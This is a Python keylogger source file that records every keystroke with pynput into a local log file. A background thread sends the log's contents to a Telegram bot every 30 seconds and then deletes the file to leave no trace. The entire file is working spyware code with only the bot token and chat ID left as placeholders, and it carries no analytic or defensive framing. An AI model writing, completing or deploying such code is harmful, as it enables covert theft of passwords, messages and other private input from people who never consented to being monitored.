from pynput import keyboard
import requests
import time
import threading
import os


telegram_bot_token = "REPLACE_YOUR_TOKEN"
chatID = "your_chat_id_here"

# this is the file where keystrokes will be stored
LOG_FILE = "path_File"


# ────────────────────────────────────────────────
# Function that handles each key press
# ────────────────────────────────────────────────
def OnPress(key) : # Define the function for handling key presses
     try : 
         # Open the log file in append mode
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            # 1 — Handle normal character keys (letters, numbers, symbols)
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)
                return
            # 2 — Handle numpad keys using virtual-key codes (vk)
            vk = getattr(key, 'vk', None)
            if isinstance(vk, int):
                # If key is between Numpad 0–9
                if 96 <= vk <= 105:
                    f.write(str(vk - 96))# Convert VK code to actual number
                    return
                # Other VK keys    
                f.write(f'[VK_{vk}]')
                return
            # 3 — Handle special keys (Shift, Enter, Backspace, etc.)
            kstr = str(key)               
            if kstr.startswith('Key.'):
                kstr = kstr.replace('Key.', '') # Format: Key.enter → enter
            f.write(f'[{kstr}]')
     except Exception as e:
         # If a logging error occurs, write it to the file
         with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f'[Error:{e}]')
             
# ────────────────────────────────────────────────
# Function to send text messages to Telegram
# ────────────────────────────────────────────────
def sendingkeys(message):
    url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
    # Prepare the payload with chat ID and message text
    payload = {"chat_id": chatID, "text": message}

    try:
        # Send POST request to Telegram API
        r = requests.post(url, data=payload)
        print("Status:", r.status_code)
        print("Response:", r.text)
    except Exception as e:
        print("Something went wrong:", e)


# ────────────────────────────────────────────────
# Background thread: Reads log file every 30s and sends it
# ────────────────────────────────────────────────
def report_logs():
    while True:
        try:
            # If log file exists, read it
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, 'r', encoding='utf-8') as f:
                    log_contents = f.read()

                if log_contents:                 # send only if not empty
                    sendingkeys(log_contents)
                    os.remove(LOG_FILE)          # delete file only after sending

        except Exception as e:
            print("Error:", e)

        time.sleep(30)  # Wait 30 seconds before next check

# start background thread
t = threading.Thread(target=report_logs)
t.daemon = True    # thread closes when main program closes
t.start()
            
    
# Create the keyboard listener with `on_press` handler       
with keyboard.Listener (
    on_press = OnPress) as listener :
    listener.join()











